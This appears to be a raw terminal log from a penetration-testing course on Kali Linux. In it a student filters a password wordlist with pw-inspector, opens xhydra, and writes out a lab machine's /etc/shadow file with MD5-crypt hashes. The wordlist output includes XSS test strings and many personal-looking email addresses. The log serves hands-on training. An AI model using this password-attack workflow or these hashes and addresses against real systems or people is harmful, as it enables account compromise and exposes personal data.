+Elito e prekrasno momi4e ;)
+Esto no es una prueba de MD5
+Esto si es una prueba de MD5
+FJWr3X35w7nyqgZeHr8wo1
+Freestyler970Freestyler970
+I Love Indetectables.N3T
+JestemBeCometAiJestempr0:eye:
+JfnnlDI7RTiF9RgfG2JNCw==
+LP+vi8jtiQZBFVJCXkyLRA==
+OGy3DkWZPxgqjfWKmXrJEA==
+PaMarRuu6VxDqasesVfJgvD2fhk=
+QN9wb1WzCy0U3RZe/HELqA==
+QYYoUiD1cbIlTi2jPbgoQ0
+UPNE05tkNK2BT5ZFHnwDODhmjD1v
+Vincent1533&Vincent1533
+YvmDbXxRaVlTbysV3V0kmFtvL0TB
+YvmDbXxRaVlTbysV3V0kmFtvL0TBH
+ZXJpcjRxbnJ1YnZxbmU%3D
+a%3A2%3A%7Bs%3A5%3A%22
+aD0enmhTH4T+JJJZtoqWUv8XDx4=
+aXRhbGlhbiBoYWNrZXIgY3Jldwo=
+hM7O2NKhyOjKzJAMAjb2OahjpIEQ
+kikugalanetSebastian15
+mbnCNs7PhE1eO96SdS1x7w
+oJONJcKYstX.nPTm8D7W81
+qwXdI7tLsxxIqJ2bJ1WkBerBUK8=
+senha00EgwuN1XhLSsyG62Q
+xa%3A2%3A%7Bs%3A5%3A%22
+zHvBpAVJQoTlT72OhRUCJw==
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# cat out_alice.txt pw-inspector -i pwd_alice.txt -o out_alice.txt -l 1 -u 1 -n 1 -m 21[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ccat out_alice.txt [K[2@wc -l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C
+52 out_alice.txt
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# wc -l out_alice.txt [2Pcat[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cpw-inspector -i pwd_alice.txt -o out_alice.txt -l 1 -u 1 -n 1 -m 21[1P[1P[1P[1P[1P[1P
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# pw-inspector -i pwd_alice.txt -o out_alice.txt -l -u -n -m 21[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cwc -l out_alice.txt [K[2Pcat[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[2@wc -l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cpw-inspector -i pwd_alice.txt -o out_alice.txt -l -u -n -m 21[K2
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# pw-inspector -i pwd_alice.txt -o out_alice.txt -l -u -n -m 221[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cwc -l out_alice.txt [K
+52 out_alice.txt
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# wc -l out_alice.txt pw-inspector -i pwd_alice.txt -o out_alice.txt -l -u -n -m 221[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cwc -l out_alice.txt [K[2Pcat[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C
+# This is a list of 2,151,220 unique ASCII passwords in sorted order according
+# $DateTime: 2016/03/27 16:04:06 $
+$1$$EceVAwadNboWKXCg2DfVp1
+$1$$i63gBKzKSznjzUiEWRZh0.
+$1$A$OsW5TjmIcgkbKylJ6NkWP
+$1$xxJB$bV79PPPRMT1dNXglbKfhs
+.Cesar.2009.Alejandro.
+0000003yLcfGKtH7M6p4z1
+0Ou8VvrxN7KO1IhMbLY/JA==
+0bTW3MNmJ0AWCOkaYmiA7DIVGt8DX
+12345678912Gg4A1hpReg019t
+2/wTFCw1KTyb5Sxi/bcbIw==
+4QrcOUm6Wau+VuBX8g+IPg
+51573m45zsFp5blYC6AIppsl
+6ZoYxCjLONXyYIU2eJIuAw==
+<h1>You are PWNED</h1>
+@fytEm10 *Vb^mZ3%100iRt3h1337
+Abbasraoufmahio20082010
+BM8t9xgtFQVRJKnrjmVG8g==
+BpFdMuHWpZE7d1JApE/xpHzHqWA=
+BulletForMyValentine<3
+Dnj4IQzrMSn8oup753tAPw==
+EAANt8NPs4oz7rDY_bz3pQHLg--~A
+Elito e prekrasno momi4e ;)
+Esto no es una prueba de MD5
+Esto si es una prueba de MD5
+FJWr3X35w7nyqgZeHr8wo1
+Freestyler970Freestyler970
+I Love Indetectables.N3T
+JestemBeCometAiJestempr0:eye:
+JfnnlDI7RTiF9RgfG2JNCw==
+LP+vi8jtiQZBFVJCXkyLRA==
+OGy3DkWZPxgqjfWKmXrJEA==
+PaMarRuu6VxDqasesVfJgvD2fhk=
+QN9wb1WzCy0U3RZe/HELqA==
+QYYoUiD1cbIlTi2jPbgoQ0
+UPNE05tkNK2BT5ZFHnwDODhmjD1v
+Vincent1533&Vincent1533
+YvmDbXxRaVlTbysV3V0kmFtvL0TB
+YvmDbXxRaVlTbysV3V0kmFtvL0TBH
+ZXJpcjRxbnJ1YnZxbmU%3D
+a%3A2%3A%7Bs%3A5%3A%22
+aD0enmhTH4T+JJJZtoqWUv8XDx4=
+aXRhbGlhbiBoYWNrZXIgY3Jldwo=
+hM7O2NKhyOjKzJAMAjb2OahjpIEQ
+kikugalanetSebastian15
+mbnCNs7PhE1eO96SdS1x7w
+oJONJcKYstX.nPTm8D7W81
+qwXdI7tLsxxIqJ2bJ1WkBerBUK8=
+senha00EgwuN1XhLSsyG62Q
+xa%3A2%3A%7Bs%3A5%3A%22
+zHvBpAVJQoTlT72OhRUCJw==
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# cat out_alice.txt [2@wc -l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cpw-inspector -i pwd_alice.txt -o out_alice.txt -l -u -n -m 22[K[K[K[K[K[K[C[1@ [1@-[1@m[C[1@ [1@2[1@2[C[C[C[C[C[C[C[C[C
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# pw-inspector -i pwd_alice.txt -o out_alice.txt -m 22 -l -u -n[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ccat out_alice.txt [K
+# This is a list of 2,151,220 unique ASCII passwords in sorted order according
+# $DateTime: 2016/03/27 16:04:06 $
+$1$$EceVAwadNboWKXCg2DfVp1
+$1$$i63gBKzKSznjzUiEWRZh0.
+$1$A$OsW5TjmIcgkbKylJ6NkWP
+$1$xxJB$bV79PPPRMT1dNXglbKfhs
+.Cesar.2009.Alejandro.
+0000003yLcfGKtH7M6p4z1
+0Ou8VvrxN7KO1IhMbLY/JA==
+0bTW3MNmJ0AWCOkaYmiA7DIVGt8DX
+12345678912Gg4A1hpReg019t
+2/wTFCw1KTyb5Sxi/bcbIw==
+4QrcOUm6Wau+VuBX8g+IPg
+51573m45zsFp5blYC6AIppsl
+6ZoYxCjLONXyYIU2eJIuAw==
+<h1>You are PWNED</h1>
+@fytEm10 *Vb^mZ3%100iRt3h1337
+Abbasraoufmahio20082010
+BM8t9xgtFQVRJKnrjmVG8g==
+BpFdMuHWpZE7d1JApE/xpHzHqWA=
+BulletForMyValentine<3
+Dnj4IQzrMSn8oup753tAPw==
+EAANt8NPs4oz7rDY_bz3pQHLg--~A
+Elito e prekrasno momi4e ;)
+Esto no es una prueba de MD5
+Esto si es una prueba de MD5
+FJWr3X35w7nyqgZeHr8wo1
+Freestyler970Freestyler970
+I Love Indetectables.N3T
+JestemBeCometAiJestempr0:eye:
+JfnnlDI7RTiF9RgfG2JNCw==
+LP+vi8jtiQZBFVJCXkyLRA==
+OGy3DkWZPxgqjfWKmXrJEA==
+PaMarRuu6VxDqasesVfJgvD2fhk=
+QN9wb1WzCy0U3RZe/HELqA==
+QYYoUiD1cbIlTi2jPbgoQ0
+UPNE05tkNK2BT5ZFHnwDODhmjD1v
+Vincent1533&Vincent1533
+YvmDbXxRaVlTbysV3V0kmFtvL0TB
+YvmDbXxRaVlTbysV3V0kmFtvL0TBH
+ZXJpcjRxbnJ1YnZxbmU%3D
+a%3A2%3A%7Bs%3A5%3A%22
+aD0enmhTH4T+JJJZtoqWUv8XDx4=
+aXRhbGlhbiBoYWNrZXIgY3Jldwo=
+hM7O2NKhyOjKzJAMAjb2OahjpIEQ
+kikugalanetSebastian15
+mbnCNs7PhE1eO96SdS1x7w
+oJONJcKYstX.nPTm8D7W81
+qwXdI7tLsxxIqJ2bJ1WkBerBUK8=
+senha00EgwuN1XhLSsyG62Q
+xa%3A2%3A%7Bs%3A5%3A%22
+zHvBpAVJQoTlT72OhRUCJw==
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# cat out_alice.txt pw-inspector -i pwd_alice.txt -o out_alice.txt -m 22 -l -u -n[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ccat out_alice.txt [K[2@wc -l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cpw-inspector -i pwd_alice.txt -o out_alice.txt -l -u -n -m 22[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cwc -l out_alice.txt [K
+52 out_alice.txt
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# wc -l out_alice.txt [2Pcat[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cpw-inspector -i pwd_alice.txt -o out_alice.txt -m 22 -l -u -n[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ccat out_alice.txt [K[2@wc -l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cpw-inspector -i pwd_alice.txt -o out_alice.txt -l -u -n -m 22[C[1@ [1@-[1@p
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# pw-inspector -i pwd_alice.txt -o out_alice.txt -l -u -n -p -m 22[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cwc -l out_alice.txt [K
+37 out_alice.txt
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# cat out_alice.txt 
+# This is a list of 2,151,220 unique ASCII passwords in sorted order according
+# $DateTime: 2016/03/27 16:04:06 $
+$1$$EceVAwadNboWKXCg2DfVp1
+$1$$i63gBKzKSznjzUiEWRZh0.
+$1$A$OsW5TjmIcgkbKylJ6NkWP
+$1$xxJB$bV79PPPRMT1dNXglbKfhs
+.Cesar.2009.Alejandro.
+0Ou8VvrxN7KO1IhMbLY/JA==
+2/wTFCw1KTyb5Sxi/bcbIw==
+4QrcOUm6Wau+VuBX8g+IPg
+6ZoYxCjLONXyYIU2eJIuAw==
+<h1>You are PWNED</h1>
+@fytEm10 *Vb^mZ3%100iRt3h1337
+BM8t9xgtFQVRJKnrjmVG8g==
+BpFdMuHWpZE7d1JApE/xpHzHqWA=
+BulletForMyValentine<3
+Dnj4IQzrMSn8oup753tAPw==
+EAANt8NPs4oz7rDY_bz3pQHLg--~A
+Elito e prekrasno momi4e ;)
+Esto no es una prueba de MD5
+Esto si es una prueba de MD5
+I Love Indetectables.N3T
+JestemBeCometAiJestempr0:eye:
+JfnnlDI7RTiF9RgfG2JNCw==
+LP+vi8jtiQZBFVJCXkyLRA==
+OGy3DkWZPxgqjfWKmXrJEA==
+PaMarRuu6VxDqasesVfJgvD2fhk=
+QN9wb1WzCy0U3RZe/HELqA==
+Vincent1533&Vincent1533
+ZXJpcjRxbnJ1YnZxbmU%3D
+a%3A2%3A%7Bs%3A5%3A%22
+aD0enmhTH4T+JJJZtoqWUv8XDx4=
+aXRhbGlhbiBoYWNrZXIgY3Jldwo=
+oJONJcKYstX.nPTm8D7W81
+qwXdI7tLsxxIqJ2bJ1WkBerBUK8=
+xa%3A2%3A%7Bs%3A5%3A%22
+zHvBpAVJQoTlT72OhRUCJw==
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# cat out_alice.txt [2@wc -l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cpw-inspector -i pwd_alice.txt -o out_alice.txt -l -u -n -p -m 22[1P[1P[1P[1P[1P[1P[C[1@ [1@-[1@m[C[1@ [1@2[1@2[C[C[C[C[C[C[C[C[C[C[C[C[K[K[K[K[K[K
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# pw-inspector -i pwd_alice.txt -o out_alice.txt -m 22 -n -p[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ccat out_alice.txt [K[2@wc -l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C
+88 out_alice.txt
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# wc -l out_alice.txt pw-inspector -i pwd_alice.txt -o out_alice.txt -m 22 -n -p[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ccat out_alice.txt [K
+# This is a list of 2,151,220 unique ASCII passwords in sorted order according
+# $DateTime: 2016/03/27 16:04:06 $
+"><script>alert(1)</script>
+$1$$EceVAwadNboWKXCg2DfVp1
+$1$$i63gBKzKSznjzUiEWRZh0.
+$1$A$OsW5TjmIcgkbKylJ6NkWP
+$1$xxJB$bV79PPPRMT1dNXglbKfhs
+.Cesar.2009.Alejandro.
+0Ou8VvrxN7KO1IhMbLY/JA==
+111-222-1933email@address.com
+111-222-1933email@address.tst
+18/5/6/45/11/1/qwerty98765
+1lpha2ravo3harlie4elta**###
+1q2w3e4r5t6y7u8i9o0p-[=]
+2/wTFCw1KTyb5Sxi/bcbIw==
+21st century schizoid man
+23 14 17 26 15 24 16 8 12 2
+4QrcOUm6Wau+VuBX8g+IPg
+4UJ2-5NLF-HFFA-9JW3-X2KV
+6ZoYxCjLONXyYIU2eJIuAw==
+88RVD-ACD27-ACAXT-7RXDN
+<h1>You are PWNED</h1>
+<script>alert(1)</script>
+@fytEm10 *Vb^mZ3%100iRt3h1337
+BM8t9xgtFQVRJKnrjmVG8g==
+BpFdMuHWpZE7d1JApE/xpHzHqWA=
+BulletForMyValentine<3
+Dnj4IQzrMSn8oup753tAPw==
+EAANt8NPs4oz7rDY_bz3pQHLg--~A
+ERWINRYAN_14@YAHOO.COM
+Elito e prekrasno momi4e ;)
+Esto no es una prueba de MD5
+Esto si es una prueba de MD5
+I Love Indetectables.N3T
+JestemBeCometAiJestempr0:eye:
+JfnnlDI7RTiF9RgfG2JNCw==
+LP+vi8jtiQZBFVJCXkyLRA==
+OGy3DkWZPxgqjfWKmXrJEA==
+PaMarRuu6VxDqasesVfJgvD2fhk=
+QN9wb1WzCy0U3RZe/HELqA==
+Vincent1533&Vincent1533
+ZXJpcjRxbnJ1YnZxbmU%3D
+a%3A2%3A%7Bs%3A5%3A%22
+aD0enmhTH4T+JJJZtoqWUv8XDx4=
+aXRhbGlhbiBoYWNrZXIgY3Jldwo=
+adriano___10@hotmail.com
+angelz_gon_28@yahoo.com
+ballbanger_87@hotmail.com
+barca3.2009@hotmail.fr
+bhutoijo2004@yahoo.co.uk
+billsfanpt239@yahoo.com
+cutecapricorn85@hotmail.com
+emmalou965@hotmail.com
+f48a4948c8ea5a546f48...912c34
+gerardomiguel08@yahoo.com
+h3artbroken@hotmail.co.uk
+http://www.md5encrypter.com/
+kingriadtoufik23..........23
+knightdevil7gun@hotmail.com
+kyokushin1991@yahoo.com
+loe_she21st#yahoo.co.id
+loe_she21st@yahoo.co.id
+loeschen1@googlemail.com
+marcusandres89@live.com
+melissamaya69@yahoo.com
+mfdn04fyinihamptccgp7g==
+mimoza-185@hotmail.com
+oJONJcKYstX.nPTm8D7W81
+predrag_93@hotmail.com
+qwXdI7tLsxxIqJ2bJ1WkBerBUK8=
+reva_4lien@yahoo.co.id
+sandra_oliva22@hotmail.com
+sirmicandrijana96@hotmail.com
+sry musst bis zum 21 warten
+striped_girl_11@mail.ru
+t0-hasl0-j3st-bardz0-dlugi3
+tanzeelch17@hotmail.com
+terrysoh357#hotmail.com
+terrysoh357~hotmail.com
+viktorija112@yahoo.com
+waterwolf96@hotmail.com
+whitementor68#yahoo.com
+whitementor68@yahoo.com
+www.md5decrypter.co.uk
+www.myspace.com/drumgod911
+xa%3A2%3A%7Bs%3A5%3A%22
+zHvBpAVJQoTlT72OhRUCJw==
+|102|232|219|21|79|107
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# cat out_alice.txt [2@wc -l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cpw-inspector -i pwd_alice.txt -o out_alice.txt -m 22 -n -p[K]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# pw-inspector -i pwd_alice.txt -o out_alice.txt -m 22 -n -p[K[A]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# pw-inspector -i pwd_alice.txt -o out_alice.txt -m 22 -n -p[K[A]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# pw-inspector -i pwd_alice.txt -o out_alice.txt -m 22 -n -p[K[A]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# pw-inspector -i pwd_alice.txt -o out_alice.txt -m 22 -n -p[K[K[K -p
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# pw-inspector -i pwd_alice.txt -o out_alice.txt -m 22 -n -p[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ccat out_alice.txt [K[2@wc -l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C
+88 out_alice.txt
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# wc -l out_alice.txt pw-inspector -i pwd_alice.txt -o out_alice.txt -m 22 -n -p
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# pw-inspector -i pwd_alice.txt -o out_alice.txt -m 22 -n -p[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[38Pwc -l out_alice.txt 
+88 out_alice.txt
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# wc -l out_alice.txt pw-inspector -i pwd_alice.txt -o out_alice.txt -m 22 -n -p[Kl -u
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# pw-inspector -i pwd_alice.txt -o out_alice.txt -m 22 -n -l -u[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cwc -l out_alice.txt [K
+52 out_alice.txt
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# xhydra 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# vim shadow_stol[K[K[K.txt
+[?1000h[?1049h[22;0;0t[>4;2m[?1h=[?2004h[1;46r[?12h[?12l[22;2t[22;1t[27m[23m[29m[m[H[2J[?25l[46;1H"shadow_s.txt" [File nuovo][2;1H▽[6n[2;1H  [1;1H[>c]10;?]11;?[2;1H[94m~                                                                                                        [3;1H~                                                                                                        [4;1H~                                                                                                        [5;1H~                                                                                                        [6;1H~                                                                                                        [7;1H~                                                                                                        [8;1H~                                                                                                        [9;1H~                                                                                                        [10;1H~                                                                                                        [11;1H~                                                                                                        [12;1H~                                                                                                        [13;1H~                                                                                                        [14;1H~                                                                                                        [15;1H~                                                                                                        [16;1H~                                                                                                        [17;1H~                                                                                                        [18;1H~                                                                                                        [19;1H~                                                                                                        [20;1H~                                                                                                        [21;1H~                                                                                                        [22;1H~                                                                                                        [23;1H~                                                                                                        [24;1H~                                                                                                        [25;1H~                                                                                                        [26;1H~                                                                                                        [27;1H~                                                                                                        [28;1H~                                                                                                        [29;1H~                                                                                                        [30;1H~                                                                                                        [31;1H~                                                                                                        [32;1H~                                                                                                        [33;1H~                                                                                                        [34;1H~                                                                                                        [35;1H~                                                                                                        [36;1H~                                                                                                        [37;1H~                                                                                                        [38;1H~                                                                                                        [39;1H~                                                                                                        [40;1H~                                                                                                        [41;1H~                                                                                                        [42;1H~                                                                                                        [43;1H~                                                                                                        [44;1H~                                                                                                        [45;1H~                                                                                                        [m[46;88H0,0-1[9CTut[1;1H[?25hP+q436f\P+q6b75\P+q6b64\P+q6b72\P+q6b6c\P+q2332\P+q2334\P+q2569\P+q2a37\P+q6b31\[?1000l[?1006h[?1002h[?1006l[?1002l[?1006h[?1002h[?25l[46;78Hi[1;1H[46;78H [1;1H[46;1H[1m-- INSERISCI --[m[46;16H[K[46;88H0,1[11CTut[1;1H[?25h[?25ldaemon:*:14684:0:99999:7:::
+bin:*:14684:0:99999:7:::[2;25H[K[3;1Hsys:$1$fUX6B[3;13H[K[3;13H[?25h[?25lPOt$Miyc3UpOzQJqz4s5wFD9l0:14742:0:99999:7:::
+sync:*:14684:0:99999:7[4;23H[K[4;23H[?25h[?25l:::
+games:*:14684:0:99999:7:::[5;27H[K[6;1Hman:*:14684:0:99999:7:::[6;25H[K[7;1Hlp:*:14684[7;11H[K[7;11H[?25h[?25l:0:99999:7:::
+mail:*:14684:0:99999:7:::[8;26H[K[9;1Hnews:*:14684:0:99999:7:::[9;26H[K[9;26H[?25h[?25l
+uucp:*:14684:0:99999:7:::[10;26H[K[11;1Hproxy:*:14684:0:99999:7:::[11;27H[K[12;1Hwww-data:*:[12;12H[K[12;12H[?25h[?25l14684:0:99999:7:::
+backup:*:14684:0:99999:7:::[13;28H[K[14;1Hlist:*:14684:0:99[14;18H[K[14;18H[?25h[?25l999:7:::
+irc:*:14684:0:99999:7:::[15;25H[K[16;1Hgnats:*:14684:0:99999:7:::[16;27H[K[17;1Hnob[17;4H[K[17;4H[?25h[?25lody:*:14684:0:99999:7:::
+libuuid:!:14684:0:99999:7:::[18;29H[K[19;1Hdhcp:*:14[19;10H[K[19;10H[?25h[?25l684:0:99999:7:::
+syslog:*:14684:0:99999:7:::[20;28H[K[21;1Hklog:$1$f2ZVMS4K$R[21;19H[K[21;19H[?25h[?25l9XkI.CmLdHhdUE3X9jqP0:14742:0:99999:7:::
+sshd:*:14684:0:99999:7[22;23H[K[22;23H[?25h[?25l:::
+msfadmin:$1$qca3dsPG$4xMWK1mJIWIwi.dh/fNU4.:16994:0:99999:7[23;60H[K[23;60H[?25h[?25l:::
+bind:*:14685:0:99999:7:::[24;26H[K[25;1Hpostfix:*:14685:0:99999:7:::[25;29H[K[26;1Hftp:[26;5H[K[26;5H[?25h[?25l*:14685:0:99999:7:::
+postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe[27;43H[K[27;43H[?25h[?25l/:14685:0:99999:7:::
+mysql:!:14685:0:99999:7:::[28;27H[K[29;1Htomcat55:*:1469[29;16H[K[29;16H[?25h[?25l1:0:99999:7:::
+distccd:*:14698:0:99999:7:::[30;29H[K[31;1Huser:$1$HESu9xrH$k.[31;20H[K[31;20H[?25h[?25lo3G93DGoXIiQKkPmUgZ0:14699:0:99999:7:::
+service:$1$kR3ue7JZ$7Gx[32;24H[K[32;24H[?25h[?25lELDupr5Ohp6cjZ3Bu//:14715:0:99999:7:::
+telnetd:*:14715:0:99999:[33;25H[K[33;25H[?25h[?25l7:::
+proftpd:!:14727:0:99999:7:::[34;29H[K[35;1Hstatd:*:15474:0:99999:7:::[35;27H[K[36;1Hsn[36;3H[K[36;3H[?25h[?25lmp:*:15480:0:99999:7:::
+alice:$1$lCtstULF$JALYhorA6kHwFiLOQbPBk[37;40H[K[37;40H[?25h[?25l1:17587:0:99999:7:::
+bob:$1$NuU11mJV$l01w9dV2uFBBqjlKrZL7k1:169[38;43H[K[38;43H[?25h[?25l94:0:99999:7:::
+david:$1$nTU11mJV$IHhkQ9f4RlpACAbJI3VlV.:16994:[39;48H[K[39;48H[?25h[?25l0:99999:7:::
+ciao:$1$Zn2wPHiE$O3MsCva4EkH1RPSIo37nf.:18228:0:99[40;51H[K[40;51H[?25h[?25l[1;45r[45;1H
+[1;46r[39;51H999:7:::[40;1H[K[45;1H[94m~                                                                                                        [m[46;88H[K[46;88H41,1[10CFon[40;1H[?25h[46;1H[K[40;1H[?25l[46;78H^[[40;1H[46;78H  [40;1H[46;88H41,0-1[8CFon[40;1H[?25h[?25l[46;78H:[40;1H[46;78H[K[46;1H:[?2004h[?25hwq[?25l[?1006l[?1002l[?2004l"shadow_s.txt" [Nuovo] 41L, 1412C scritti[23;2t[23;1t
+[?2004l[?1l>[?25h[>4;m[?1049l[23;0;0t]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# cat shadow_s.txt 
+daemon:*:14684:0:99999:7:::
+bin:*:14684:0:99999:7:::
+sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:14742:0:99999:7:::
+sync:*:14684:0:99999:7:::
+games:*:14684:0:99999:7:::
+man:*:14684:0:99999:7:::
+lp:*:14684:0:99999:7:::
+mail:*:14684:0:99999:7:::
+news:*:14684:0:99999:7:::
+uucp:*:14684:0:99999:7:::
+proxy:*:14684:0:99999:7:::
+www-data:*:14684:0:99999:7:::
+backup:*:14684:0:99999:7:::
+list:*:14684:0:99999:7:::
+irc:*:14684:0:99999:7:::
+gnats:*:14684:0:99999:7:::
+nobody:*:14684:0:99999:7:::
+libuuid:!:14684:0:99999:7:::
+dhcp:*:14684:0:99999:7:::
+syslog:*:14684:0:99999:7:::
+klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:14742:0:99999:7:::
+sshd:*:14684:0:99999:7:::
+msfadmin:$1$qca3dsPG$4xMWK1mJIWIwi.dh/fNU4.:16994:0:99999:7:::
+bind:*:14685:0:99999:7:::
+postfix:*:14685:0:99999:7:::
